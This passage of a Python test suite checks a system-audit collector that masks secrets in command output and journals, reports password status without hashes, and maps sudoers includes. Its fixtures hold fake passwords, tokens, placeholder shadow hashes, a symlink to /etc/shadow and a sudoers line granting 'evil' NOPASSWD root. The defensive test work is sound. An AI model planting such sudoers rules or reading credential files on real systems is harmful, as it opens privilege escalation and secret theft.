        self.assertNotIn(b"zz9", masked)
        self.assertNotIn(b"MII", masked)
        self.assertEqual(counts, {"private_key": 1, "password": 2})

    def test_masked_values_are_not_masked_twice(self):
        masked, counts = self.mask(b"token=ghp_" + b"d" * 36 + b"\n")
        self.assertEqual(masked, b"token=[MASKED:github_token]\n")
        self.assertEqual(counts, {"github_token": 1})


class ReadSmallTests(unittest.TestCase):
    def test_read_errors_after_opening_count_as_missing(self):
        collector = load_collector("/")

        class Failing(io.BytesIO):
            def read(self, *args):
                raise OSError(5, "Input/output error")

        collector.open_regular_file = lambda absolute: (Failing(), None)
        self.assertIsNone(collector.read_small("/etc/os-release"))
        self.assertEqual(collector.read_os_release(), {})


class PriorityTests(unittest.TestCase):
    def test_collector_lowers_its_own_priority(self):
        settings_json = settings([])
        program = COLLECTOR.read_text() + "\nmain(" + json.dumps(settings_json) + ")\n"
        result = subprocess.run(
            [sys.executable, "-I", "-B", "-"],
            input=program.encode("utf-8"),
            capture_output=True,
            timeout=60,
        )
        manifest = json.loads(gzip.decompress(result.stdout).splitlines()[0])
        self.assertEqual(manifest["priority"]["nice"], 19)
        self.assertIn(manifest["priority"]["io"], ("idle", "unchanged"))
        if os.uname().machine == "x86_64":
            self.assertEqual(manifest["priority"]["io"], "idle")
        self.assertEqual(manifest["masking_version"], 5)


# --- PR 1.1 groundwork: walks, commands, the journal, resource use ------------------


def direct_run(collector, seconds=60, source_bytes=1 << 20):
    """A Run outside main(), for calling helpers directly. Returns (run, read),
    where read() closes the stream and returns its records."""
    out = io.BytesIO()
    stream = collector.Stream(out)
    run = collector.Run(
        stream, json.loads(settings([], source_bytes=source_bytes)), time.monotonic() + seconds
    )

    def read():
        stream.close()
        return [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]

    return run, read


FAKE_JOURNALCTL = b"""#!/bin/sh
printf '{"MESSAGE":"args %s"}\\n' "$*"
printf '{"MESSAGE":"sudo: COMMAND=/usr/bin/mysql -pS3cret"}\\n'
echo 'warning: token=abc123def' >&2
exit 0
"""


class WalkTests(FixtureRoot):
    def setUp(self):
        super().setUp()
        self.collector = load_collector(self.root)
        self.write("etc/app/conf", b"setting = 1\n")
        tool = self.write("etc/app/bin/tool", b"#!/bin/sh\necho hi\n")
        tool.chmod(0o4755)
        big = self.write("etc/app/bin/big", b"x" * 4096)
        big.chmod(0o755)
        self.write("etc/app/deep/a/b/c/file", b"deep\n")
        os.symlink("/etc/shadow", Path(self.root, "etc/app/shadow-link"))
        os.symlink("/", Path(self.root, "etc/app/root-link"))

    def walk(self, **kwargs):
        run, _ = direct_run(self.collector)
        walk = self.collector.Walk(run, "/etc/app", **kwargs)
        return {entry["path"]: entry for entry in walk}, walk.summary()

    def test_records_entries_and_hashes_small_executables(self):
        entries, summary = self.walk(hash_bytes=1024)
        self.assertEqual(entries["/etc/app"]["type"], "d")
        tool = entries["/etc/app/bin/tool"]
        self.assertEqual(tool["mode"], "4755")
        expected = hashlib.sha256(b"#!/bin/sh\necho hi\n").hexdigest()
        self.assertEqual(tool["sha256"], expected)
        self.assertNotIn("sha256", entries["/etc/app/conf"])  # not executable
        self.assertEqual(entries["/etc/app/bin/big"]["hash_skipped"], "larger than 1024 bytes")
        self.assertIn("/etc/app/deep/a/b/c/file", entries)
        self.assertFalse(summary["truncated"])
        self.assertEqual(summary["entries"], len(entries))

    def test_hash_all_files(self):
        entries, _ = self.walk(hash_files="all")
        self.assertIn("sha256", entries["/etc/app/conf"])

    def test_never_follows_links(self):
        entries, _ = self.walk()
        self.assertEqual(entries["/etc/app/shadow-link"]["type"], "l")
        self.assertEqual(entries["/etc/app/shadow-link"]["link_target"], "/etc/shadow")
        self.assertEqual(entries["/etc/app/root-link"]["link_target"], "/")
        self.assertFalse(any(p.startswith("/etc/app/root-link/") for p in entries))

    def test_depth_limit_is_a_recorded_gap(self):
        entries, summary = self.walk(max_depth=2)
        self.assertEqual(entries["/etc/app/deep/a"]["not_descended"], "depth")
        self.assertNotIn("/etc/app/deep/a/b", entries)
        self.assertEqual(summary["not_descended"]["depth"], 1)

    def test_depth_zero_lists_only_the_top(self):
        entries, summary = self.walk(max_depth=0)
        self.assertEqual(list(entries), ["/etc/app"])
        self.assertEqual(entries["/etc/app"]["not_descended"], "depth")
        self.assertFalse(summary["truncated"])

    def test_entry_limit_checked_before_opening_a_directory(self):
        entries, summary = self.walk(max_entries=1)
        self.assertEqual(list(entries), ["/etc/app"])
        self.assertEqual(summary["truncated_reason"], "entries")

    def test_entry_limit_truncates(self):
        entries, summary = self.walk(max_entries=3)
        self.assertEqual(len(entries), 3)
        self.assertEqual(summary["truncated_reason"], "entries")

    def test_out_of_time_stops_the_walk(self):
        run, _ = direct_run(self.collector, seconds=-1)
        walk = self.collector.Walk(run, "/etc/app")
        self.assertEqual(len(list(walk)), 1)  # the top only
        self.assertEqual(walk.summary()["truncated_reason"], "time")

    def test_top_link_records_its_target(self):
        os.symlink("/etc/app", Path(self.root, "etc/app-link"))
        run, _ = direct_run(self.collector)
        entries = list(self.collector.Walk(run, "/etc/app-link"))
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["link_target"], "/etc/app")

    def test_parent_swapped_for_a_link_is_not_followed(self):
        os.makedirs(Path(self.root, "elsewhere/a/secret-dir"))
        run, _ = direct_run(self.collector)
        seen = []
        for entry in self.collector.Walk(run, "/etc/app"):
            seen.append(entry)
            if entry.get("path") == "/etc/app/deep/a" and "error" not in entry:
                # /etc/app/deep/a is queued; now make its parent a link elsewhere.
                os.rename(Path(self.root, "etc/app/deep"), Path(self.root, "etc/app/deep-old"))
                os.symlink(Path(self.root, "elsewhere"), Path(self.root, "etc/app/deep"))
        paths = [e["path"] for e in seen]
        self.assertNotIn("/etc/app/deep/a/secret-dir", paths)
        self.assertIn({"path": "/etc/app/deep/a", "error": "replaced during the walk"}, seen)

    def test_missing_top_is_an_error_entry(self):
        run, _ = direct_run(self.collector)
        walk = self.collector.Walk(run, "/nowhere")
        self.assertIn("error", list(walk)[0])
        self.assertEqual(walk.summary()["errors"], 1)

    def test_walking_changes_no_access_times(self):
        conf = Path(self.root, "etc/app/conf")
        before = conf.stat().st_atime_ns
        self.walk(hash_files="all")
        self.assertEqual(conf.stat().st_atime_ns, before)


class CommandTests(FixtureRoot):
    def install(self, script, mode=0o755):
        target = self.write("usr/bin/journalctl", script)
        target.chmod(mode)
        return target

    def run_command(self, args=("--x",), seconds=60, source_bytes=1 << 20, transform=None):
        collector = load_collector(self.root)
        run, read = direct_run(collector, seconds=seconds, source_bytes=source_bytes)
        timed_out = False
        self.failure = None
        try:
            code = collector.run_command(run, "test", "journalctl", list(args), transform)
        except collector.ModuleTimeout:
            code, timed_out = None, True
        except collector.CommandFailed as exc:
            code, self.failure = None, str(exc)
        return code, timed_out, read()

    def test_output_is_a_masked_command_source(self):
        self.install(FAKE_JOURNALCTL)
        code, _, records = self.run_command(args=["--a", "b c"])
        self.assertEqual(code, 0)
        ((name, (start, content, end)),) = sources(records).items()
        self.assertEqual(start["kind"], "command")
        self.assertEqual(start["meta"]["argv"], ["/usr/bin/journalctl", "--a", "b c"])
        self.assertEqual(name, "/usr/bin/journalctl --a 'b c'")
        expected = hashlib.sha256(FAKE_JOURNALCTL).hexdigest()
        self.assertEqual(start["meta"]["executable_sha256"], expected)
        self.assertIn(b'"args --a b c"', content)
        self.assertNotIn(b"S3cret", content)
        self.assertEqual(end["exit_code"], 0)
        self.assertEqual(end["stderr"], "warning: token=[MASKED:password]\n")
        self.assertEqual(end["masked"], {"mysql_password": 1, "password": 1})

    def test_gets_no_input_and_a_fixed_environment(self):
        self.install(b"#!/bin/sh\nread x && echo got-input\nenv | sort\n")
        _, _, records = self.run_command()
        ((_, content, _),) = sources(records).values()
        self.assertNotIn(b"got-input", content)
        names = {line.split("=")[0] for line in content.decode().split()}
        # The shell adds PWD, SHLVL and _ itself.
        self.assertEqual(names - {"PWD", "SHLVL", "_"}, {"LC_ALL", "PATH"})
        self.assertIn("PATH=/usr/sbin:/usr/bin:/sbin:/bin", content.decode())

    def test_input_is_opened_read_only(self):
        # Access mode 0 (O_RDONLY) in the low bits of the flags of stdin.
        self.install(b"#!/bin/sh\nexec grep '^flags' /proc/self/fdinfo/0\n")
        _, _, records = self.run_command()
        ((_, content, _),) = sources(records).values()
        self.assertEqual(int(content.split()[1], 8) & 3, 0)

    def test_failure_ends_the_source_then_fails_the_module(self):
        self.install(b"#!/bin/sh\necho 'no journal files' >&2\nexit 3\n")
        _, _, records = self.run_command()
        self.assertEqual(self.failure, "journalctl exited with status 3")
        ((_, _, end),) = sources(records).values()
        self.assertEqual((end["exit_code"], end["stderr"]), (3, "no journal files\n"))

    def test_failed_command_marks_the_module_and_run(self):
        self.install(b"#!/bin/sh\nexit 3\n")
        trailer = collect(self.root, ["auth_journal"])[-1]
        self.assertEqual(trailer["modules"]["auth_journal"]["status"], "error")
        self.assertEqual(trailer["status"], "partial")

    def test_long_error_output_withholds_the_cut_line(self):
        # 4,000 bytes of filler, so the 4 KiB cap falls inside a URL password.
        filler = b"line of forty characters, padding....."
        script = b"#!/bin/sh\nfor i in $(seq 1 100); do echo '%s' >&2; done\n" % filler
        script += b"echo 'url https://u:hunter2-very-long-password@example.com' >&2\n" * 10
        self.install(script)
        _, _, records = self.run_command()
        ((_, _, end),) = sources(records).values()
        self.assertTrue(end["stderr_truncated"])
        self.assertTrue(end["stderr"].endswith("\n"))
        self.assertLessEqual(len(end["stderr"]), 4096)
        self.assertNotIn("hunter2", end["stderr"])

    def test_error_line_cut_by_a_kill_is_withheld(self):
        self.install(b"#!/bin/sh\nprintf 'ok\\nurl https://u:hunter2-partial' >&2\nexec sleep 30\n")
        _, timed_out, records = self.run_command(seconds=1)
        self.assertTrue(timed_out)
        ((_, _, end),) = sources(records).values()
        self.assertEqual(end["stderr"], "ok\n")
        self.assertTrue(end["stderr_truncated"])

    def test_output_line_cut_by_the_deadline_is_withheld(self):
        self.install(b"#!/bin/sh\nprintf 'ok\\nurl https://u:hunter2-partial'\nexec sleep 30\n")
        _, timed_out, records = self.run_command(seconds=1)
        self.assertTrue(timed_out)
        ((_, content, end),) = sources(records).values()
        self.assertEqual(content, b"ok\n")
        self.assertEqual(end["truncated_reason"], "time")

    def test_endless_line_stops_at_the_byte_cap(self):
        self.install(b"#!/bin/sh\nexec head -c 5000000 /dev/zero\n")
        began = time.monotonic()
        _, timed_out, records = self.run_command(source_bytes=1 << 20, seconds=30)
        self.assertLess(time.monotonic() - began, 10)
        self.assertFalse(timed_out)
        ((_, content, end),) = sources(records).values()
        self.assertEqual((content, end["truncated_reason"]), (b"", "size"))

    def test_child_holding_the_pipes_is_killed_at_the_deadline(self):
        # The command exits at once, leaving a child with its output open.
        self.install(b"#!/bin/sh\nsleep 30 &\necho done\n")
        began = time.monotonic()
        _, timed_out, records = self.run_command(seconds=1)
        self.assertLess(time.monotonic() - began, 10)
        self.assertTrue(timed_out)
        ((_, content, _),) = sources(records).values()
        self.assertEqual(content, b"done\n")

    def test_size_cap_stops_the_command(self):
        self.install(b"#!/bin/sh\nwhile :; do echo 0123456789; done\n")
        code, timed_out, records = self.run_command(source_bytes=1000)
        self.assertFalse(timed_out)
        self.assertLess(code, 0)  # killed
        ((_, content, end),) = sources(records).values()
        self.assertEqual(end["truncated_reason"], "size")
        self.assertEqual(len(content), 990)  # whole lines only

    def test_time_limit_kills_a_silent_command(self):
        self.install(b"#!/bin/sh\necho started\nexec sleep 30\n")
        began = time.monotonic()
        code, timed_out, records = self.run_command(seconds=1)
        self.assertLess(time.monotonic() - began, 10)
        self.assertTrue(timed_out)
        ((_, content, end),) = sources(records).values()
        self.assertEqual(content, b"started\n")
        self.assertEqual(end["truncated_reason"], "time")

    def test_missing_command_is_recorded(self):
        code, _, records = self.run_command()
        self.assertIsNone(code)
        self.assertEqual(
            named(records, "command_unavailable")[0]["data"]["reason"], "not installed"
        )

    def test_refuses_an_executable_others_can_change(self):
        self.install(FAKE_JOURNALCTL, mode=0o775)
        code, _, records = self.run_command()
        self.assertIsNone(code)
        reason = named(records, "command_unavailable")[0]["data"]["reason"]
        self.assertIn("writable by group or others", reason)
        self.assertEqual(sources(records), {})


class JournalTests(FixtureRoot):
    def setUp(self):
        super().setUp()
        self.collector = load_collector(self.root)

    def test_auth_journal_asks_for_auth_facilities_in_the_window(self):
        target = self.write("usr/bin/journalctl", FAKE_JOURNALCTL)
        target.chmod(0o755)
        records = collect(self.root, ["auth_journal"], days=1)
        ((start, content, _),) = sources(records).values()
        argv = start["meta"]["argv"]
        self.assertIn("--output=json", argv)
        self.assertEqual(argv[-2:], ["SYSLOG_FACILITY=4", "SYSLOG_FACILITY=10"])
        since = [a for a in argv if a.startswith("--since=@")][0]
        self.assertAlmostEqual(int(since[len("--since=@") :]), NOW - DAY, delta=60)
        self.assertIn("--all", argv)  # else fields over 4 KiB become null
        fields = [a for a in argv if a.startswith("--output-fields=")][0]
        self.assertNotIn("_CMDLINE", fields)
        self.assertEqual(records[-1]["modules"]["auth_journal"]["status"], "ok")

    def test_byte_array_fields_are_masked(self):
        message = list(b"login password=hunter2 \xff")
        line = json.dumps({"MESSAGE": message, "_PID": "1"}).encode() + b"\n"
        masker = self.collector.Masker()
        out = json.loads(self.collector.mask_journal_line(line, masker))
        self.assertEqual(bytes(out["MESSAGE"]), b"login password=[MASKED:password] \xff")
        self.assertEqual(masker.counts, {"password": 1})

    def test_repeated_fields_are_masked_too(self):
        line = json.dumps({"X": [list(b"token=abc"), "secret=xyz"]}).encode() + b"\n"
        masker = self.collector.Masker()
        out = json.loads(self.collector.mask_journal_line(line, masker))
        self.assertEqual(bytes(out["X"][0]), b"token=[MASKED:password]")
        self.assertEqual(out["X"][1], "secret=[MASKED:password]")

    def test_masks_values_not_json_text(self):
        message = 'sudo: COMMAND=/usr/bin/mysql -p"two words" -e "select 1"'
        line = json.dumps({"MESSAGE": message, "_PID": "7"}).encode() + b"\n"
        out = json.loads(self.collector.mask_journal_line(line, self.collector.Masker()))
        self.assertEqual(
            out["MESSAGE"], 'sudo: COMMAND=/usr/bin/mysql -p[MASKED:mysql_password] -e "select 1"'
        )
        self.assertEqual(out["_PID"], "7")

    def test_unquoted_secret_cannot_swallow_json(self):
        line = b'{"MESSAGE":"mysql -pS3cret","_PID":"7"}\n'
        out = json.loads(self.collector.mask_journal_line(line, self.collector.Masker()))
        self.assertEqual(out, {"MESSAGE": "mysql -p[MASKED:mysql_password]", "_PID": "7"})

    def test_key_logged_across_entries_stays_masked(self):
        masker = self.collector.Masker()
        lines = [
            {"MESSAGE": "-----BEGIN OPENSSH PRIVATE KEY-----", "_PID": "1"},
            {"MESSAGE": "b3BlbnNzaC1rZXktdjEAAAAA", "_PID": "1"},
            {"MESSAGE": "-----END OPENSSH PRIVATE KEY-----", "_PID": "1"},
            {"MESSAGE": "after", "_PID": "1"},
        ]
        out = [
            json.loads(self.collector.mask_journal_line(json.dumps(e).encode() + b"\n", masker))
            for e in lines
        ]
        self.assertEqual([e["MESSAGE"] for e in out], ["[MASKED:private_key]", "", "", "after"])
        self.assertEqual([e["_PID"] for e in out], ["1"] * 4)  # other fields unaffected
        self.assertEqual(masker.counts, {"private_key": 1})

    def test_fake_key_start_in_the_journal_hides_nothing_after_it(self):
        masker = self.collector.Masker()
        entries = [
            {"MESSAGE": "-----BEGIN OPENSSH PRIVATE KEY-----"},
            {"MESSAGE": "Accepted password for root from 198.51.100.7 port 4711 ssh2"},
        ]
        out = [
            json.loads(self.collector.mask_journal_line(json.dumps(e).encode() + b"\n", masker))
            for e in entries
        ]
        self.assertEqual(out[1], entries[1])
        self.assertEqual(masker.counts, {"private_key": 1, "private_key_unterminated": 1})

    def test_any_unparseable_line_is_withheld(self):
        out = self.collector.mask_journal_line(b"not json password=x\n", self.collector.Masker())
        self.assertEqual(out, b"[MASKED:unparsed_line 20 bytes]\n")

    def test_unparseable_line_with_arrays_is_withheld(self):
        masker = self.collector.Masker()
        out = self.collector.mask_journal_line(b'{"M":[104,105], broken\n', masker)
        self.assertEqual(out, b"[MASKED:unparsed_line 23 bytes]\n")

    def test_plain_lines_pass_through(self):
        line = b'{"MESSAGE":"Accepted publickey for jch","_AUDIT_SESSION":"5"}\n'
        self.assertEqual(self.collector.mask_journal_line(line, self.collector.Masker()), line)


class ResourceTests(FixtureRoot):
    def test_trailer_reports_peak_memory(self):
        records = collect(self.root, [])
        resources = records[-1]["resources"]
        self.assertGreater(resources["peak_rss_kb"], 0)
        self.assertIn("commands_peak_rss_kb", resources)

    def test_manifest_lists_the_allowed_commands(self):
        manifest = collect(self.root, [])[0]
        self.assertEqual(
            manifest["commands_allowed"],
            {"journalctl": ["/usr/bin/journalctl", "/bin/journalctl"]},
        )


# --- PR 1.2: accounts and access -----------------------------------------------------

ED25519 = "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"
ED25519_FP = "SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU"  # ssh-keygen -lf
SHA512_HASH = "$6$saltsalt$" + "x" * 86
# Real OpenSSH certificates (ssh-keygen -s); a certificate's fingerprint is
# its plain key's: ssh-keygen -lf gives the same for the key and the cert.
ED25519_CERT = (
    "AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAII/S9Q/WcHPzQr5Kav/ZZkd8qYw8"
    "byOdqsOFnwOgBFSHAAAAINQeF0lVFvOIeCp1UHjzXXSeCwwAdD32kn8IZPe0Wn+yAAAAAAAAAAAAAAAB"
    "AAAAA2lkMQAAAAcAAAADamNoAAAAAAAAAAD//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9y"
    "d2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZv"
    "cndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAz"
    "AAAAC3NzaC1lZDI1NTE5AAAAIGGWE5avKjZdK2uynAxWWzQ1QB0AwlBn1KzXLGMZaSMxAAAAUwAAAAtz"
    "c2gtZWQyNTUxOQAAAEBqKcbKX3xw0HA4syd233vGiiuJv2XJ+4cuJEwG3gVcA6P5Ch51QrG8dk04oS4h"
    "C1tN2F6AMq9WTshjDB4NXy0P"
)
ED25519_CERT_FP = "SHA256:WZRADrLxX2iLOFnHtOMdDEqFIh4HHjby+TFXwyjKpu8"
RSA_CERT = (
    "AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgLi/4clNkpYv4AS3n1RimDkLkbDf3jkmA"
    "qeETQOZhehUAAAADAQABAAABAQDLmyLxu/CpCPMq7RgAbFuokEpOqcgw3zwvlFdo2gc5z4wE/odHwZR2"
    "mDXNJusgviOjP6J8sh+N2azAjFQHP3D7clw926AxBh+hXUPXbBk52OJZxWk/C6UYh4ZXENleWRJQ5s1l"
    "MJUuW+5S1OUf09olSsmNkt5OLBLBp58Y/O0Ntqogt6HIEOxx28u0p7IK5z2IjK0OCWOBYaIry9oNlcly"
    "0cB4s1Je2EDEUzoE9EMujrwGpw1XKY3BbtSbG3B0McJB1xRsDvn4xfWgTgUzIPFUZ+253xhoBYV6fUqJ"
    "DxOhllRIj4AHq3UFvQZVLJTPt5oiYsN9Qq+6U9lZnVKQylDDAAAAAAAAAAAAAAABAAAAA2lkMgAAAAcA"
    "AAADamNoAAAAAAAAAAD//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAA"
    "AAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAA"
    "AAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1"
    "NTE5AAAAIGGWE5avKjZdK2uynAxWWzQ1QB0AwlBn1KzXLGMZaSMxAAAAUwAAAAtzc2gtZWQyNTUxOQAA"
    "AEDLi95VbgDXTQ8bfiVAQGuGEATTDT+aAOSS7wbzBOAxBzwepm+bn293LuqRbtYnFYW+YPTVgRPg3TUU"
    "sB1nAqME"
)
RSA_CERT_FP = "SHA256:ctvaWHlPTcyYqK1Yu3famfZeo6pfp2KLhXJ0kuSKIGE"
YESCRYPT_HASH = "$y$j9T$salt$" + "y" * 43

PASSWD = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    "jch:x:1000:1000:John Example,,,:/home/jch:/bin/bash\n"
    "toor:" + SHA512_HASH + ":0:0::/root:/bin/sh\n"
    "broken line with no fields\n"
)
SHADOW = (
    "root:*:19820:0:99999:7:::\n"
    "daemon:!!:19820::::::\n"
    "jch:" + YESCRYPT_HASH + ":20000:0:99999:7::20500:\n"
    "toor::20001:0:99999:7:::\n"
    "locked:!" + SHA512_HASH + ":20002:0:99999:7:::\n"
)
GROUP = "root:x:0:\nsudo:x:27:jch,toor\ndocker:x:999:\n"


def records_named(records, name):
    return [r["data"] for r in named(records, name)]


class PasswordStatusTests(unittest.TestCase):
    def setUp(self):
        self.collector = load_collector("/")

    def test_statuses_and_algorithms(self):
        cases = {
            "": {"status": "empty"},
            "*": {"status": "no_password"},
            "!!": {"status": "no_password"},
            "!*": {"status": "no_password"},
            "*LK*": {"status": "no_password"},
            SHA512_HASH: {"status": "set", "algorithm": "sha512"},
            "!" + SHA512_HASH: {"status": "locked", "algorithm": "sha512"},
            YESCRYPT_HASH: {"status": "set", "algorithm": "yescrypt"},
            "$1$salt$hash": {"status": "set", "algorithm": "md5"},
            "$2b$12$" + "z" * 53: {"status": "set", "algorithm": "bcrypt"},
            "abcdefghijklm": {"status": "set", "algorithm": "des"},
            "something-else": {"status": "set", "algorithm": "unknown"},
        }
        for field, expected in cases.items():
            self.assertEqual(self.collector.password_status(field), expected, field)


class AccountsTests(FixtureRoot):
    def setUp(self):
        super().setUp()
        self.write("etc/passwd", PASSWD.encode())
        self.write("etc/shadow", SHADOW.encode())
        self.write("etc/group", GROUP.encode())

    def test_accounts_without_gecos_and_password_field_as_status(self):
        records = collect(self.root, ["accounts"])
        accounts = {a["name"]: a for a in records_named(records, "account")}
        self.assertEqual(
            accounts["jch"],
            {
                "name": "jch",
                "uid": 1000,
                "gid": 1000,
                "home": "/home/jch",
                "shell": "/bin/bash",
                "line": 3,
                "password": {"status": "shadowed"},
            },
        )
        # A hash in /etc/passwd itself is reduced to its status too.
        self.assertEqual(accounts["toor"]["password"], {"status": "set", "algorithm": "sha512"})
        malformed = records_named(records, "malformed_lines")
        self.assertEqual(malformed, [{"path": "/etc/passwd", "lines": [5]}])
        self.assertEqual(records[-1]["modules"]["accounts"]["status"], "ok")

    def test_shadow_sends_status_and_dates_never_hashes(self):
        out = io.BytesIO()
        load_collector(self.root).main(settings(["accounts"]), out=out)
        raw = gzip.decompress(out.getvalue())
        for secret in (b"saltsalt", b"xxxxxxxx", b"yyyyyyyy", b"$6$", b"$y$", b"John Example"):
            self.assertNotIn(secret, raw)
        records = [json.loads(line) for line in raw.splitlines()]
        status = {s["name"]: s for s in records_named(records, "password_status")}
        self.assertEqual(status["root"]["status"], "no_password")
        self.assertEqual(status["daemon"]["status"], "no_password")
        self.assertEqual(status["toor"]["status"], "empty")
        self.assertEqual(status["locked"]["status"], "locked")
        jch = status["jch"]
        self.assertEqual((jch["status"], jch["algorithm"]), ("set", "yescrypt"))
        self.assertEqual(jch["last_change"], "2024-10-04")
        self.assertEqual(jch["expire"], "2026-02-16")
        self.assertIsNone(jch["inactive_days"])

    def test_account_files_and_groups(self):
        records = collect(self.root, ["accounts"])
        paths = [f["path"] for f in records_named(records, "account_file")]
        self.assertEqual(paths, ["/etc/passwd", "/etc/group", "/etc/shadow"])
        groups = {g["name"]: g["members"] for g in records_named(records, "group")}
        self.assertEqual(groups["sudo"], ["jch", "toor"])

    def test_unreadable_shadow_is_recorded(self):
        os.remove(Path(self.root, "etc/shadow"))
        records = collect(self.root, ["accounts"])
        self.assertEqual(records_named(records, "unreadable_file")[0]["path"], "/etc/shadow")

    def test_oversized_account_file_is_read_to_whole_lines(self):
        collector = load_collector(self.root)
        collector.ACCOUNT_FILE_BYTES = len(PASSWD.splitlines(keepends=True)[0]) + 10
        out = io.BytesIO()
        collector.main(settings(["accounts"]), out=out)
        records = [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]
        self.assertEqual([a["name"] for a in records_named(records, "account")], ["root"])
        gaps = {g["path"] for g in records_named(records, "incomplete_file")}
        self.assertIn("/etc/passwd", gaps)

    def test_unreadable_group_file_is_recorded(self):
        os.remove(Path(self.root, "etc/group"))
        records = collect(self.root, ["accounts"])
        self.assertEqual(records_named(records, "unreadable_file")[0]["path"], "/etc/group")

    def test_shell_history_metadata_only(self):
        self.write("home/jch/.bash_history", b"mysql -pS3cret\n")
        Path(self.root, "root").mkdir()
        os.symlink("/dev/null", Path(self.root, "root/.bash_history"))
        out = io.BytesIO()
        load_collector(self.root).main(settings(["accounts"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"mysql", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        history = {h["path"]: h for h in records_named(records, "shell_history")}
        self.assertEqual(history["/root/.bash_history"]["link_target"], "/dev/null")
        self.assertEqual(history["/root/.bash_history"]["accounts"], ["root", "toor"])
        self.assertEqual(history["/home/jch/.bash_history"]["size"], 15)


class SudoersTests(FixtureRoot):
    def test_follows_includes_and_marks_what_sudo_reads(self):
        self.write(
            "etc/sudoers", b"root ALL=(ALL) ALL\n@includedir /etc/sudoers.d\n#include extra\n"
        )
        self.write("etc/extra", b"jch ALL=(ALL) NOPASSWD: ALL\n")
        self.write("etc/sudoers.d/deploy", b"deploy ALL=(root) /usr/bin/systemctl\n")
        self.write("etc/sudoers.d/old.bak", b"evil ALL=(ALL) NOPASSWD: ALL\n")
        records = collect(self.root, ["sudoers"])
        self.assertEqual(
            sorted(sources(records)),
            ["/etc/extra", "/etc/sudoers", "/etc/sudoers.d/deploy", "/etc/sudoers.d/old.bak"],
        )
        (included,) = records_named(records, "include_dir")
        self.assertEqual(
            included["files"],
            [{"name": "deploy", "sudo_reads": True}, {"name": "old.bak", "sudo_reads": False}],
        )

    def test_config_links_are_followed_inside_the_system(self):
        self.write("etc/authselect/sudoers", b"root ALL=(ALL) ALL\n")
        os.symlink("authselect/sudoers", Path(self.root, "etc/sudoers"))
        records = collect(self.root, ["sudoers"])
        (link,) = records_named(records, "config_link")
        self.assertEqual(link["resolved"], "/etc/authselect/sudoers")
        self.assertEqual(sorted(sources(records)), ["/etc/authselect/sudoers"])

    def test_escaped_include_paths(self):
        self.write("etc/sudoers", b"@include /etc/sudoers\\ local\n")
        self.write("etc/sudoers local", b"jch ALL=(ALL) NOPASSWD: ALL\n")
        records = collect(self.root, ["sudoers"])
        self.assertEqual(sorted(sources(records)), ["/etc/sudoers", "/etc/sudoers local"])

    def test_config_text_only_from_system_locations(self):
        self.write("etc/sudoers", b"#include /opt/app/sudoers\n@includedir /etc/sudoers.d\n")
        self.write("opt/app/sudoers", b"app ALL=(ALL) NOPASSWD: ALL\n")
        self.write("etc/sudoers.d/linked-src", b"x ALL=(ALL) ALL\n")
        os.link(
            Path(self.root, "etc/sudoers.d/linked-src"), Path(self.root, "etc/sudoers.d/linked")
        )
        records = collect(self.root, ["sudoers"])
        self.assertEqual(sorted(sources(records)), ["/etc/sudoers"])
        reasons = {r["path"]: r["reason"] for r in records_named(records, "unreadable_file")}
        self.assertIn("outside the system locations", reasons["/opt/app/sudoers"])
        self.assertIn("hard-linked", reasons["/etc/sudoers.d/linked"])

    def test_hard_links_from_packages_under_usr_are_read(self):
        self.write("usr/share/crypto-policies/DEFAULT/opensshserver.txt", b"Ciphers aes256-gcm\n")
        os.link(
            Path(self.root, "usr/share/crypto-policies/DEFAULT/opensshserver.txt"),
            Path(self.root, "usr/share/crypto-policies/FUTURE-opensshserver.txt"),
        )
        self.write("etc/ssh/sshd_config", b"Include /usr/share/crypto-policies/DEFAULT/*.txt\n")
        for owner, expected in ((os.getuid(), True), (os.getuid() + 1, False)):
            collector = load_collector(self.root)
            # Package files are root's; a hard link to a user's file is the
            # user's, so it is never read.
            collector.PACKAGE_OWNER_UID = owner
            out = io.BytesIO()
            collector.main(settings(["ssh"]), out=out)
            records = [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]
            sent = "/usr/share/crypto-policies/DEFAULT/opensshserver.txt" in sources(records)
            self.assertEqual(sent, expected, owner)

    def test_large_included_directory_is_read_incrementally(self):
        self.write("etc/sudoers", b"@includedir /etc/sudoers.d\n")
        for index in range(5):
            self.write(f"etc/sudoers.d/f{index}", b"x ALL=(ALL) ALL\n")
        collector = load_collector(self.root)
        collector.MAX_DIR_FILES = 2
        out = io.BytesIO()
        collector.main(settings(["sudoers"]), out=out)
        records = [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]
        (listing,) = records_named(records, "include_dir")
        self.assertEqual((len(listing["files"]), listing["truncated"]), (2, True))

    def test_include_loop_ends(self):
        self.write("etc/sudoers", b"#include /etc/sudoers\n")
        records = collect(self.root, ["sudoers"])
        self.assertEqual(sorted(sources(records)), ["/etc/sudoers"])
        self.assertEqual(records[-1]["status"], "complete")


class SshTests(FixtureRoot):
    def setUp(self):
        super().setUp()
        self.write("etc/passwd", PASSWD.encode())

    def keys(self, records):
        return records_named(records, "authorized_key")

